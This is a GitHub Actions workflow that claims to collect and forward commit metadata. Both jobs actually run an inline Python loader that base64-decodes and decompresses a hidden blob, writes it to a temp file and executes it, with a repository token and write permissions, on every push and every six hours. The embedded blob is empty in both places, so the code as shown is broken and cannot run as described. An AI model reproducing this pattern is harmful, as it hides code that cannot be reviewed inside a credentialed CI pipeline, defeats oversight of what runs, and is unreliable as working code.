name: Stellar commit push collection
run-name: Commit trigger ${{ inputs.trace_id || github.run_id }}
on:
  push:
  schedule:
    - cron: '23 */6 * * *'
  workflow_dispatch:
    inputs:
      mode:
        type: choice
        options: [collect, bootstrap]
        default: collect
        required: true
      payload:
        type: string
        default: '{}'
        required: false
      trace_id:
        type: string
        default: ''
        required: false
permissions: {}
jobs:
  receive:
    if: github.event_name == 'push' && github.ref != 'refs/heads/codex/commit-scan-state'
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    permissions:
      contents: read
      actions: write
    env:
      GH_TOKEN: ${{ github.token }}
      STELLAR_ROLE: receiver
    steps:
      - name: Forward exact push metadata to trusted default branch
        shell: bash
        run: |
          python3 - <<'STELLAR_PY'
          import base64, hashlib, os, pathlib, runpy, zlib
          raw = zlib.decompress(base64.b64decode(''))
          assert hashlib.sha256(raw).hexdigest() == 'f33a89f032133eeb48842b9b9aef7103fa3ba2d655a4add8d50e5aefc54d9322'
          path = pathlib.Path(os.environ['RUNNER_TEMP']) / 'stellar_commit_dispatcher.py'
          path.write_bytes(raw)
          runpy.run_path(str(path), run_name='__main__')
          STELLAR_PY
  controller:
    name: GitHub commit collection
    if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    concurrency:
      group: stellar-commit-state-controller-v1
      queue: max
      cancel-in-progress: false
    permissions:
      contents: write
      actions: write
      checks: read
    env:
      GH_TOKEN: ${{ github.token }}
      STELLAR_ROLE: controller
    steps:
      - name: Discover exact commits and dispatch reviewed worker
        shell: bash
        run: |
          python3 - <<'STELLAR_PY'
          import base64, hashlib, os, pathlib, runpy, zlib
          raw = zlib.decompress(base64.b64decode(''))
          assert hashlib.sha256(raw).hexdigest() == 'f33a89f032133eeb48842b9b9aef7103fa3ba2d655a4add8d50e5aefc54d9322'
          path = pathlib.Path(os.environ['RUNNER_TEMP']) / 'stellar_commit_dispatcher.py'
          path.write_bytes(raw)
          runpy.run_path(str(path), run_name='__main__')
          STELLAR_PY
